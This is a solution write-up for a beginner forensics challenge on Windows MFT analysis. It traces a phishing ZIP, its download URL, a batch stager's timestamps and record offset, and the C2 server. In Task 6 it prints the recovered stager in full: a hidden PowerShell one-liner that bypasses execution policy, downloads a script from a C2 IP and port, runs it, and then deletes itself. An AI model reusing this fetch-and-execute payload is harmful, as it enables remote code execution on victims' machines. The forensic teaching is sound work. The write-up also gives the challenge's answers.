# BFT
#### Categories: DFIR <br> Difficulty: Very Easy

## Sherlock Scenario
Sherlock Overview:

In this Sherlock, you will become acquainted with MFT (Master File Table) forensics. You will be introduced to well-known tools and methodologies for analyzing MFT artifacts to identify malicious activity. During our analysis, you will utilize the MFTECmd tool to parse the provided MFT file, TimeLine Explorer to open and analyze the results from the parsed MFT, and a Hex editor to recover file contents from the MFT.

Tools Used:

MFTECmd
TimeLine Explorer
HxD Hex Editor
MFTECmd.exe -f "C:\Users\CyberJunkie\Desktop\C\\$MFT" --csv "C:\Users\CyberJunkie\Desktop\" --csvf MFT_ANALYSIS.csv

The above command processes the MFT file located in "C:\Users\CyberJunkie\Desktop\C" and creates a CSV file named MFT_ANALYSIS.csv on the Desktop of the user CyberJunkie.

Note: You will need to replace the file paths with your own.

Next, open the CSV file in TimeLine Explorer to begin your analysis.

## Attachments
- `BFT.zip`

## Solve
After downloading and extracting the attachment, I obtained the `$MFT` file. I used `MFTECmd` to parse the MFT records into a `.csv` file for forensic analysis in Timeline Explorer.

<br>

### Task 1
#### Question:
Simon Stark was targeted by attackers on February 13. He downloaded a ZIP file from a link received in an email. What was the name of the ZIP file he downloaded from the link?

#### Answer:
Filtering for the `.zip` extension with the parent path set to `Downloads` yields two files: `Stage-20240213T093324Z-001.zip` and `KAPE.zip`. Since `KAPE.zip` is a legitimate forensic triage tool, the malicious archive downloaded from the link is `Stage-20240213T093324Z-001.zip`.

Answer: **Stage-20240213T093324Z-001.zip**

<br>

### Task 2
#### Question:
Examine the Zone Identifier contents for the initially downloaded ZIP file. This field reveals the HostUrl from where the file was downloaded, serving as a valuable Indicator of Compromise (IOC) in our investigation/analysis. What is the full Host URL from where this ZIP file was downloaded?

#### Answer:
Inspecting the Alternate Data Stream (ADS) `Zone.Identifier` associated with `Stage-20240213T093324Z-001.zip` reveals the origin URL stored in the `HostUrl` field:
```
[ZoneTransfer]
ZoneId=3
HostUrl=[https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser](https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser)
```

Answer: **https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser**

<br>

### Task 3
#### Question:
What is the full path and name of the malicious file that executed malicious code and connected to a C2 server?

#### Answer:
Following up from Task 1, inspecting the contents extracted from `Stage-20240213T093324Z-001.zip` reveals a nested directory structure containing a batch script named `invoice.bat`.

Answer: **C:\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice\invoices\invoice.bat**

<br>

### Task 4
#### Question:
Analyze the $Created0x30 timestamp for the previously identified file. When was this file created on disk?

#### Answer:
Checking the `$Created0x30` (`$FILE_NAME` attribute creation timestamp) column for the `invoice.bat` record in Timeline Explorer shows the timestamp `2024-02-13 16:38:39`.

Answer: **2024-02-13 16:38:39**

<br>

### Task 5
#### Question:
Finding the hex offset of an MFT record is beneficial in many investigative scenarios. Find the hex offset of the stager file from Question 3.

#### Answer:
The MFT Entry Number (record number) for `invoice.bat` is `23426`. Since each MFT record is exactly 1024 bytes (0x400 bytes) in size, the byte offset in hex is calculated as follows:
$$23426 \times 1024 = 23988224 \text{ (decimal)} = \text{0x16E3000}$$

Answer: **16E3000**

<br>

### Task 6
#### Question:
Each MFT record is 1024 bytes in size. If a file on disk has smaller size than 1024 bytes, they can be stored directly on MFT File itself. These are called MFT Resident files. During Windows File system Investigation, its crucial to look for any malicious/suspicious files that may be resident in MFT. This way we can find contents of malicious files/scripts. Find the contents of The malicious stager identified in Question3 and answer with the C2 IP and port.

#### Answer:
Navigating to hex offset `0x16E3000` in HxD displays the raw 1024-byte MFT record for `invoice.bat`. Because the script is small, its `$DATA` attribute is resident within the record itself, revealing the payload:
``` powershell
@echo off
start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('[http://43.204.110.203:6666/download/powershell/Om1hdHRpZmVzdGF](http://43.204.110.203:6666/download/powershell/Om1hdHRpZmVzdGF�W9uIGV0dw==') -UseBasicParsing|iex"
(goto) 2>nul & del "%~f0"
```

The script establishes an outbound connection to the C2 server at `43.204.110.203:6666`.

Answer: **43.204.110.203:6666**